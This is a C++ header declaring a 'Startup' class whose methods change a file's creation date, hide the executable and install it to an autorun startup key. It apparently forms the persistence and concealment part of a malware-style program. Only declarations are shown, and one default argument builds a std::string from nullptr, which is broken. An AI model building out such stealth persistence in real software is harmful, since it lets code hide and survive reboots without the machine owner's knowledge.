#pragma once
#include <string>

class Startup
{
public:

	//Change file creation date
	static void SetFileCreationDate(const std::string path = nullptr);

	//Hide Executable 
	static bool HideFile(std::string path);

	//Check if app installed to autorun
	//static bool IsInstall();

	static bool IsInstalledToStartup(const std::string& startup_name = StartupName,
		const std::string install_file = InstallFile,
		const std::string startup_key = StartupKey
	);

	//Install module to startup
	static void Install();

	//executable is running from startup directory
	static bool IsFromStartup();

	//get current directory
	static std::string getCurrentDirectory();

	static std::string getFullFilePath(const std::string installDirectory);

	static std::string GetCurrentFileName(std::string path);

public:
	//Install
	static std::string CurrentExecutablePath;

	static std::string InstallDirectory;

	//AutoRun
	static std::string InstallFile;

	static std::string  StartupKey;

	static std::string StartupName;
};


